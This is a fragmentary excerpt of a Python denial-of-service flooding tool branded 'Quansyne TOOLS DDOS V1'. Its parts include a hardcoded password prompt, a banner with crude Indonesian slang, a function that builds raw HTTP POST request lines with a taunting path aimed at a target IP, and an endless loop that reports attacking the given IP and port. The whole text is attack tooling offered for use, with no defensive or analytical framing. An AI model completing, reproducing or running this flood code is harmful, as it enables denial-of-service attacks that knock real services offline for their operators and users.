...
os.system('color ' +random.choice(['B'])+ " & Quansyne TOOLS DDOS V1 [ Enter Pass ]")

password = input("[ + ] Password : ")

if password == "Quanshyne23":
...
print("[ × ]  Kontol Comunity [ × ]")

print("[ + ]  Kontol Comunity by Quanshyne ")

print("[ + ] Jangan Abuse Ya Kontol ")

print("=======================================================================================")

print("[ + ] Preference Code : Irgy ")

print("[ + ] Update Tool: Kontol Komuniti")
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        ...
        post_host = "POST /Server_Lo_Got_DDoS_By_Quanshyne_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    while True:
        ...
        try:
            ...
            print("[ + ] Tools Nyerang r IP => ",ip," In Port ",port,"!")
